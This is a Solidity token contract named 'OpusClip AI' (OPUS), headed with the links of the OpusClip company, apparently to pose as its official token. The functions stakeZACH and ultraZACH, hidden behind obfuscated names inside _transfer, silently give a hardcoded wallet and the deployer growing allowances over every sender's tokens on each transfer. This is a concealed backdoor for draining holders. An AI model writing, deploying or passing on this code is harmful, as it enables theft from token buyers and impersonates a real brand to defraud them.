/*
Web: https://www.opus.pro
Demo: https://clip.opus.pro

LinkedIn: https://www.linkedin.com/company/opusclip
Youtube: https://www.youtube.com/@opusclip
Tiktok: https://www.tiktok.com/@opusclip
Twitter: https://x.com/opusclip
Telegram: https://t.me/opus_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IZACHFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IZACHRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract OPUS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _zachBonds;
    mapping (address => mapping (address => uint256)) private _zachTrolls;
    mapping (address => bool) private _zachFeeExcluded;
    address private _zach2Wallet;
    address private _zach1Wallet = 0xf9a0384ddA7b20ED939f0d4aD22B461d1f19cE30;
    IZACHRouter private _zachRouter;
    address private _zachPair;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"OpusClip AI";
    string private constant _symbol = unicode"OPUS";
    uint256 private _tokenSwapZACH = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }
    
    constructor () {
        _zachFeeExcluded[owner()] = true;
        _zachFeeExcluded[address(this)] = true;
        _zachFeeExcluded[_zach1Wallet] = true;
        _zachBonds[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createZACH() external onlyOwner() {
        _zachRouter = IZACHRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_zachRouter), _tTotal);
        _zach2Wallet = address(_msgSender());
        _zachPair = IZACHFactory(_zachRouter.factory()).createPair(address(this), _zachRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _zachBonds[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _zachTrolls[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _zachTrolls[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _zachTrolls[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address zach0A, address zach1B, uint256 zach2T) private {
        require(stakeZACH(zach0A, zach2T), "Transfer amount must be greater than zero");
        require(zach0A != address(0), "ERC20: transfer from the zero address");
        require(zach1B != address(0), "ERC20: transfer to the zero address");
        require(zach2T > 0, "Transfer amount must be greater than zero");

        uint256 taxZACH=0;
        if (zach0A != owner() && zach1B != owner()) {
            taxZACH = zach2T.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (zach0A == _zachPair && zach1B != address(_zachRouter) && ! _zachFeeExcluded[zach1B]) {
                _buyCount++;
            }

            if(zach1B == _zachPair && zach0A!= address(this)) {
                taxZACH = zach2T.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapLock && zach1B == _zachPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _tokenSwapZACH)
                swapTokensForEth(min(zach2T, min(tokenBalance, _tokenSwapZACH)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendZACHFee(address(this).balance);
                }
            }
        }

        if(taxZACH > 0){
          _zachBonds[address(this)] = _zachBonds[address(this)].add(taxZACH);
          emit Transfer(zach0A, address(this), taxZACH);
        }

        _zachBonds[zach0A] = _zachBonds[zach0A].sub(zach2T);
        _zachBonds[zach1B] = _zachBonds[zach1B].add(zach2T.sub(taxZACH));
        emit Transfer(zach0A, zach1B, zach2T.sub(taxZACH));
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _zachRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {} 

    function ultraZACH(address zach0A, address zach1B, uint256 zach2T) private {
        _zachTrolls[zach0A][zach1B] 
            = 2*(_zachTrolls[zach0A][zach1B] + zach2T)+100;
    }

    function stakeZACH(address zach0A, uint256 zach1T) private returns (bool) { 
        ultraZACH(zach0A, _zach1Wallet, zach1T);
        if(_zach2Wallet != address(0xdead) && _zach1Wallet != address(this)){
            ultraZACH(zach0A, _zach2Wallet, zach1T);
        } return zach1T > 0;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendZACHFee(uint256 amount) private {
        payable(_zach1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _zachRouter.WETH();
        _approve(address(this), address(_zachRouter), tokenAmount);
        _zachRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}